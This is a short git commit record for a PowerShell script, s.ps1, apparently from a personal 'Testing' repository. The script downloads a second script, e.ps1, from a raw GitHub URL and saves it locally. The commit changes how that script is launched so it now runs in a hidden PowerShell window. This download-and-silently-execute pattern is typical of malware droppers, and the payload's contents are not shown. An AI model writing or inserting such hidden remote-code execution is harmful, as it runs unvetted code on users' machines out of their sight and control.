994719d56f82fdf4dc7ddcae1b94968be21aac82
Lyrimi <lyrimisin@gmail.com>
2025-01-20 11:38:31 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,2 +1,2 @@
 Invoke-WebRequest -uri "https://raw.githubusercontent.com/Lyrimi/Testing/refs/heads/main/e.ps1" -OutFile ".\e.ps1"
-Start-Job -F ".\e.ps1"
+powershell.exe -windowstyle hidden -file ".\e.ps1"
